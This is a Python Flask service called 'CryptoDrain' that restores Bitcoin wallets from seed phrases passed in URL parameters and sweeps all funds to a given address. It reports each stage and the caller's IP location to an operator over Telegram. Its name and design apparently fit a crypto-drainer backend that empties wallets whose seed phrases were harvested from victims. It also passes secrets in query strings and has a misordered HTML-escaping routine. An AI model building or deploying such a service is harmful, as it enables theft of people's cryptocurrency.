#!/usr/bin/env python3
"""
CryptoDrain: A Flask-based Bitcoin wallet sweeping service.
Author: @fled-dev
Version: 1.2.0
"""

from gevent import monkey
monkey.patch_all()

import logging
from logging.handlers import RotatingFileHandler
import os
import json
import re
import time
import random
import requests
import pyfiglet
import uuid

from flask import Flask, request, jsonify, g
from bitcoinlib.wallets import Wallet, wallet_delete_if_exists
from gevent.pywsgi import WSGIServer

# =============================================================================
# Configuration Class
# =============================================================================
class Config:
    """
    Loads configuration from a JSON file and allows environment variable
    overrides for sensitive values.
    """
    def __init__(self, config_path='api/config.json'):
        self.config_path = config_path
        self.load_config()
        self.override_with_env()

    def load_config(self):
        """Load configuration from the JSON file."""
        try:
            with open(self.config_path, 'r') as f:
                config = json.load(f)
        except Exception as e:
            raise Exception(f"Failed to load configuration: {e}")
        self.FLASK_API_KEYS = config.get('FLASK_API_KEYS', [])
        self.TG_NOTIFICATIONS = config.get('TG_NOTIFICATIONS', False)
        self.TG_API_KEY = config.get('TG_API_KEY', '')
        self.TG_CHANNEL_ID = config.get('TG_CHANNEL_ID', '')
        # Additional configuration values for scalability.
        self.HOST_IP = config.get('HOST_IP', '127.0.0.1')
        self.HOST_PORT = config.get('HOST_PORT', 8080)

    def override_with_env(self):
        """Override sensitive configuration values with environment variables."""
        self.TG_API_KEY = os.environ.get('TG_API_KEY', self.TG_API_KEY)
        self.TG_CHANNEL_ID = os.environ.get('TG_CHANNEL_ID', self.TG_CHANNEL_ID)
        self.HOST_IP = os.environ.get('HOST_IP', self.HOST_IP)
        self.HOST_PORT = int(os.environ.get('HOST_PORT', self.HOST_PORT))


# =============================================================================
# Logger Setup
# =============================================================================
def setup_logger(log_file='logfile.txt'):
    """
    Setup a rotating file logger.
    """
    logger = logging.getLogger('CryptoDrain')
    logger.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    handler = RotatingFileHandler(log_file, maxBytes=5 * 1024 * 1024, backupCount=2)
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    return logger

logger = setup_logger()

def safe_log(message, sensitive=False):
    """
    Log a message. If the message contains sensitive data, mark it accordingly.
    """
    if sensitive:
        logger.info("[SENSITIVE] " + message)
    else:
        logger.info(message)


# =============================================================================
# Flask App Initialization
# =============================================================================
app = Flask(__name__)


# =============================================================================
# Boot Screen Function
# =============================================================================
def boot_screen():
    """
    Clear the terminal and print the boot screen with application details.
    """
    os.system('cls' if os.name == 'nt' else 'clear')
    safe_log('Terminal cleared for boot screen.')
    ascii_banner = pyfiglet.figlet_format('CryptoDrain')
    print('\33[33m' + ascii_banner)
    print('\33[33m' + '--------------------- Version 1.2.0 ---------------------')
    print('----------------------- @fled-dev -----------------------' + '\33[0m')
    safe_log('Boot screen printed successfully.')
    time.sleep(1)


# =============================================================================
# Helper Functions
# =============================================================================
def tg_notify(message):
    """
    Send a notification to Telegram if enabled.
    Sensitive data is not included in the notification.
    """
    if not app.config['TG_NOTIFICATIONS']:
        safe_log('Telegram notification skipped as notifications are disabled.')
        return
    if not app.config['TG_API_KEY']:
        safe_log('Telegram notification error: Missing API key.')
        return
    if not app.config['TG_CHANNEL_ID']:
        safe_log('Telegram notification error: Missing channel ID.')
        return

    try:
        api_url = f'https://api.telegram.org/bot{app.config["TG_API_KEY"]}/sendMessage'
        payload = {
            'chat_id': app.config["TG_CHANNEL_ID"],
            'parse_mode': 'Markdown',
            'text': message
        }
        response = requests.post(api_url, json=payload)
        if response.status_code == 200:
            safe_log('Telegram notification sent successfully.')
        else:
            safe_log(f'Telegram notification failed with status {response.status_code}.')
    except Exception as e:
        safe_log(f'Telegram notification exception: {e}')


def get_ip_details(ip):
    """
    Retrieve IP location details from an external API and cache in flask.g.
    """
    if not hasattr(g, 'ip_details'):
        try:
            resp = requests.get(f'https://ipapi.co/{ip}/json/').json()
            g.ip_details = {
                "city": resp.get("city", "N/A"),
                "country": resp.get("country_name", "N/A")
            }
        except Exception as e:
            safe_log(f"IP lookup error: {e}")
            g.ip_details = {"city": "N/A", "country": "N/A"}
    return g.ip_details


def current_ip():
    """
    Get the current IP address from the request.
    """
    ip = request.environ.get('REMOTE_ADDR', 'N/A')
    safe_log(f'Current IP fetched: {ip}')
    return ip


def sanitize_input(value):
    """
    Sanitize input to prevent XSS attacks.
    """
    if value:
        return value.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
    return value


def validate_input(api_key, seedphrase, receiver, balance):
    """
    Validate input parameters using proper formats.
    """
    # Validate API key using the uuid module.
    try:
        uuid.UUID(api_key)
    except Exception:
        return False, "Invalid API key format."

    # Validate seed phrase: expecting 12 to 24 words.
    if seedphrase:
        words = seedphrase.split()
        if len(words) < 12 or len(words) > 24:
            return False, "Invalid seed phrase format."

    # Validate receiver address using regex for Bitcoin addresses.
    if receiver:
        if not re.fullmatch(r'(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}', receiver):
            return False, "Invalid receiver address format."

    # Validate balance: should be a positive number with up to 8 decimal places.
    if balance:
        if not re.fullmatch(r'\d+(\.\d{1,8})?', balance):
            return False, "Invalid balance format."

    return True, "Valid input."


# =============================================================================
# Wallet Manager Class
# =============================================================================
class WalletManager:
    """
    Manage wallet creation and sweeping operations.
    """
    def __init__(self, seedphrase):
        self.seedphrase = sanitize_input(seedphrase)
        self.wallet = None
        self.wallet_name = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(12))

    def create_wallet(self):
        """
        Create a wallet using the provided seed phrase.
        """
        try:
            # Delete an existing wallet with the same name if it exists.
            if wallet_delete_if_exists(self.wallet_name, force=True):
                safe_log(f"Existing wallet {self.wallet_name} deleted.", sensitive=True)
        except Exception as e:
            safe_log(f"Error deleting existing wallet: {e}")

        try:
            safe_log("Creating wallet...", sensitive=True)
            self.wallet = Wallet.create(
                self.wallet_name,
                keys=self.seedphrase,
                network='bitcoin',
                witness_type='segwit'
            )
            self.wallet.scan()
            safe_log("Wallet created and scanned successfully.", sensitive=True)
            return True, "Wallet created successfully."
        except Exception as e:
            safe_log(f"Wallet creation failed: {e}")
            return False, f"Wallet creation failed: {e}"

    def sweep_wallet(self, receiver):
        """
        Sweep wallet funds to the provided receiver address.
        """
        try:
            safe_log("Sweeping wallet...", sensitive=True)
            _ = self.wallet.sweep(receiver, offline=False)
            safe_log("Wallet swept successfully.", sensitive=True)
            return True, "Wallet swept successfully."
        except Exception as e:
            safe_log(f"Wallet sweep failed: {e}")
            return False, f"Wallet sweep failed: {e}"


# =============================================================================
# API Endpoints
# =============================================================================
@app.route('/api')
def api_route():
    """
    API endpoint to create and sweep a wallet.
    """
    try:
        safe_log("API endpoint called. Validating request.")
        api_key = request.args.get('api-key')
        seedphrase = request.args.get('seedphrase')
        receiver = request.args.get('receiver')
        balance = request.args.get('balance')

        # Validate input parameters.
        is_valid, validation_message = validate_input(api_key, seedphrase, receiver, balance)
        if not is_valid:
            safe_log(f'Input validation failed: {validation_message}')
            return jsonify({'error': validation_message}), 400

        # Check if API key is authorized.
        if api_key not in app.config['FLASK_API_KEYS']:
            ip = current_ip()
            details = get_ip_details(ip)
            notification = (
                "*Error - Connection Refused (1/3)*\n\n"
                "Unauthorized API key attempt.\n\n"
                f"IP: {ip}\n"
                f"Location: {details.get('city')} / {details.get('country')}"
            )
            safe_log("Unauthorized API key attempt.")
            tg_notify(notification)
            return jsonify({'error': 'Invalid API key'}), 403

        safe_log("API key validated. Proceeding with wallet operations.")
        ip = current_ip()
        details = get_ip_details(ip)
        tg_notify(
            f"*Success - Connection Established (1/3)*\n\n"
            "Valid connection established.\n\n"
            f"IP: {ip}\n"
            f"Location: {details.get('city')} / {details.get('country')}"
        )

        # Process wallet operations.
        wallet_manager = WalletManager(seedphrase)
        success, message = wallet_manager.create_wallet()
        if not success:
            tg_notify(f"*Error - Wallet Creation Failed (2/3)*\n\n{message}")
            return jsonify({'error': 'Wallet creation failed.'}), 500
        tg_notify("*Success - Wallet Created (2/3)*\n\nWallet created successfully.")

        success, message = wallet_manager.sweep_wallet(receiver)
        if success:
            tg_notify("*Success - Wallet Swept (3/3)*\n\nWallet swept successfully.")
            return jsonify({'message': 'Wallet swept successfully.'}), 200
        tg_notify(f"*Error - Wallet Not Swept (3/3)*\n\n{message}")
        return jsonify({'error': 'Wallet sweep failed.'}), 500

    except Exception as e:
        safe_log(f'Unexpected error in api_route: {e}', sensitive=True)
        tg_notify("*Fatal Error - Function: api_route()*\n\nA critical error occurred. Please check the logs.")
        return jsonify({'error': 'A server error occurred. Please try again later.'}), 500


@app.route('/health')
def health():
    """
    Health-check endpoint.
    """
    return jsonify({'status': 'ok'}), 200


# =============================================================================
# Main Function
# =============================================================================
def main():
    """
    Main function to run the Flask server.
    """
    boot_screen()
    try:
        # Load configuration and store in Flask app config.
        config = Config()
        app.config['FLASK_API_KEYS'] = config.FLASK_API_KEYS
        app.config['TG_NOTIFICATIONS'] = config.TG_NOTIFICATIONS
        app.config['TG_API_KEY'] = config.TG_API_KEY
        app.config['TG_CHANNEL_ID'] = config.TG_CHANNEL_ID

        host_ip = config.HOST_IP
        host_port = config.HOST_PORT

        print(f'\033[1mHost IP: {host_ip}')
        print(f'Host Port: {host_port}\033[0m')
        print('Server is waiting for incoming requests ...')

        http_server = WSGIServer((host_ip, host_port), app)
        http_server.serve_forever()
    except Exception as e:
        safe_log(f"Fatal error in main: {e}", sensitive=True)
        tg_notify(f"*Fatal Server Error - Flask Server Couldn't Start*\n\n{e}")
        print(f'Fatal Error: {e}')


if __name__ == '__main__':
    main()
